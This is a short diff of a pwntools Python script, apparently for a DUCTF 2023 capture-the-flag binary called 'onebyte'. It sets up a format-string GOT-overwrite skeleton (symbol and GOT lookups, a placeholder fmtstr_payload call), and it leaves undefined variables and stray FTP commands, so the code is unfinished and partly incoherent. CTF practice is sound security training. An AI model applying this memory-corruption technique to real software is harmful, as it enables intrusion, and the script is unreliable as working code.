@@ -2,6 +2,11 @@ from pwn import *
 
 EXE = ELF("./onebyte")
 
+# GET FUNCTION ADDRESS
+func_address = EXE.symbols['func']
+# GET GLOBAL OFFSET TABLE ENTRY
+lib_call_address = EXE.got['lib']
+
 def conn(remote=True):
 	if not remote:
 		r = process([EXE.path])
@@ -9,19 +14,24 @@ def conn(remote=True):
 		r = remote("2023.ductf.dev", 30018)
 	return r
 
-
-
 context.binary = EXE
 context.log_level = "DEBUG"
 
-conn = remote('ftp.ubuntu.com',21)
+# connect to a process
+io = conn(False)
 
-conn.recvline()
+io.recvline()
 
-conn.send(b'USER anonymous\r\n')
+# craft a format string payload
+payload = fmtstr_payload(offset, {location : value})
+# offset = offset on the stack to the input buffer
+# location = address to write to
+# value = value to write
 
-conn.recvuntil(b' ', drop=True)
+io.send(b'USER anonymous\r\n')
 
-conn.recvline()
+io.recvuntil(b' ', drop=True)
 
-conn.close()
+io.recvline()
+
+io.close()
